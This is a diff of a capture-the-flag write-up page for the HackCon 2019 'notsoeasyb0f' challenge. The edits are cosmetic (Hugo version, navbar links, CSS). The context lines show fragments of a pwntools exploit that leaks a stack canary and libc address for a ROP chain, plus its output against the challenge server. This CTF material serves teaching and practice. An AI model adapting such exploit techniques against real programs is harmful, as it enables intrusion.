@@ -68,9 +68,7 @@
 
 
 <script>$(document).on('click', function() { $('.collapse').collapse('hide'); })</script>
- <meta name="generator" content="Hugo 0.129.0">
-        
-
+ <meta name="generator" content="Hugo 0.161.1">
         
 
         
@@ -113,15 +111,11 @@
                     
                         <ul class="nav navbar-nav navbar-right">
                             
-                                <li class="navbar-icon"><a href="https://github.com/raffaeleflorio/"><i class="fab fa-github"></i></a></li>
-                            
                                 <li class="navbar-icon"><a href="https://www.linkedin.com/in/raffaeleflorio"><i class="fab fa-linkedin"></i></a></li>
-                            
-                                <li class="navbar-icon"><a href="https://twitter.com/raffaeleflorio_"><i class="fab fa-twitter"></i></a></li>
                             
                                 <li class="navbar-icon"><a href="https://hackernoon.com/u/raffaeleflorio"><i class="fas fa-user-astronaut"></i></a></li>
                             
-                                <li class="navbar-icon"><a href="/key.asc"><i class="fas fa-key"></i></a></li>
+                                <li class="navbar-icon"><a href="https://github.com/raffaeleflorio/"><i class="fab fa-github"></i></a></li>
                             
                                 <li class="navbar-icon"><a href="mailto:raffaeleflorio@protonmail.com"><i class="fas fa-envelope"></i></a></li>
                             
@@ -159,13 +153,13 @@
 </blockquote>
 <p>In addition to the binary there is also a specific libc.</p>
 <p>You can download the binary <a href="/ctf/hackcon2019/binary/notsoeasyb0f/notsoeasyb0f">here</a> and the libc <a href="/ctf/hackcon2019/binary/notsoeasyb0f/notsoeasyb0f-libc.so">here</a></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sha256sum notsoeasyb0f notsoeasyb0f-libc.so
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sha256sum notsoeasyb0f notsoeasyb0f-libc.so
 </span></span><span style="display:flex;"><span>9cdc861043359904c6807d31990f7369c1fec2d25e545e263bb4ae2e5786883e  notsoeasyb0f
 </span></span><span style="display:flex;"><span>74ca69ada4429ae5fce87f7e3addb56f1b53964599e8526244fecd164b3c4b44  notsoeasyb0f-libc.so
 </span></span></code></pre></div><h1 id="exploitation">Exploitation</h1>
 <p>This program asks for a name, echoes it back, then it asks a sentence. It seems that both input are vulnerable to a buffer overflow.</p>
 <p>However, as the description says, <code>stack canary</code> is enabled.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ./notsoeasyb0f
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ./notsoeasyb0f
 </span></span><span style="display:flex;"><span>Enter name : NAME
 </span></span><span style="display:flex;"><span>Hello
 </span></span><span style="display:flex;"><span>NAME
@@ -202,7 +196,7 @@ Then the <code>bof</code> to build a simple <code>ROP chain</code>. With trial a
 <li>13 to leak the <code>saved EIP</code> of the <code>main</code>. In fact the latter is in the <code>__libc_start_main</code>, so in the <code>libc</code></li>
 </ul>
 <p>This is my exploit:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>prog <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;PATH_TO_THE_BINARY&#34;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
 </span></span><span style="display:flex;"><span>
@@ -254,7 +248,7 @@ Then the <code>bof</code> to build a simple <code>ROP chain</code>. With trial a
 </span></span><span style="display:flex;"><span>print t<span style="color:#f92672">.</span>recvline()
 </span></span><span style="display:flex;"><span>t<span style="color:#f92672">.</span>close()
 </span></span></code></pre></div><p>And this is the flag:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ./exploit.py <span style="color:#ae81ff">1</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ./exploit.py <span style="color:#ae81ff">1</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Opening connection to 68.183.158.95 on port 8991: Done
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> CANARY: 0x38d86c5026063f00
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> LIBC  : 0x7fa7fd1fc830
@@ -350,9 +344,6 @@ Then the <code>bof</code> to build a simple <code>ROP chain</code>. With trial a
 
 </div>
  
-    
-
-    
     
 
 </main>
